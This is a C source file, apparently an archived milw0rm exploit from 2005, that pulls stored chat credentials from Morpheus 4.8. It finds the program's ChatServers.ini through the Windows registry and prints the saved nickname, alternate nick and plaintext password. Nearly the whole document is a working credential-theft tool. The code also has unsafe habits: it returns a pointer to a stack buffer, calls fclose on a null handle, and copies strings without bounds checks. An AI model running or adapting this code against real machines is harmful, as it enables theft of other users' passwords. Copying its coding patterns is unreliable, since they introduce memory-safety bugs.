/*******************************************************************

Morpheus 4.8 Local Chat Passwords Disclosure Exploit by Kozan

Application: Morpheus 4.8 (and probably prior versions)
Vendor: Streamcast Networks - www.streamcastnetworks.com
Vulnerable Description: Morpheus 4.8 discloses chat passwords
to local users.


Discovered & Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*******************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


int adresal(char *FilePath,char *Str)
{
char kr;
int Sayac=0;
int Offset=-1;
FILE *di;
di=fopen(FilePath,"rb");

if( di == NULL )
{
fclose(di);
return -1;
}

while(!feof(di))
{
Sayac++;
for(int i=0;i<strlen(Str);i++)
{
kr=getc(di);
if(kr != Str[i])
{
if( i>0 )
{
fseek(di,Sayac+1,SEEK_SET);
}
break;
}
if( i > ( strlen(Str)-2 ) )
{
Offset = ftell(di)-strlen(Str);
fclose(di);
return Offset;
}
}
}
fclose(di);
return -1;
}


char *oku(char *FilePath,char *Str)
{

FILE *di;
char cr;
int i=0;
char Feature[500];
char AhUlanSelmanOmrumuYedin = 0x0D;

int Offset = adresal(FilePath,Str);

if( Offset == -1 )
return "";

if( (di=fopen(FilePath,"rb")) == NULL )
return "";

fseek(di,Offset+strlen(Str),SEEK_SET);

while(!feof(di))
{
cr=getc(di);
if(cr == AhUlanSelmanOmrumuYedin)
break;
Feature[i] = cr;
i++;
}

Feature[i] = '\0';
fclose(di);
return Feature;
}




int main()
{
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
0,
KEY_QUERY_VALUE,
&hKey) == ERROR_SUCCESS)
{

lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
(LPBYTE) prgfiles, &dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
{
RegCloseKey(hKey);
printf("An error occured!\n");
exit(1);
}

RegCloseKey(hKey);

}
else
{
RegCloseKey(hKey);
printf("An error occured!\n");
exit(1);
}

strcat(prgfiles,"\\StreamCast\\Morpheus\\ChatServers.ini");


printf("Morpheus 4.8 Local Chat Password Disclosure Exploit by Kozan\n");
printf("Credits to ATmaCA\n");
printf("www.netmagister.com - www.spyinstructors.com \n");
printf("kozan@netmagister.com \n\n");

char Nickname[BUFSIZE], AltNick[BUFSIZE], Password[BUFSIZE];

strcpy(Nickname,oku(prgfiles,"Nick="));
strcpy(AltNick,oku(prgfiles,"AltNick="));
strcpy(Password,oku(prgfiles,"Pwd="));

printf("Nickname : %s\n",Nickname);
printf("Altnick : %s\n",AltNick);
printf("Password : %s\n",Password);

return 0;
} 

// milw0rm.com [2005-04-13]
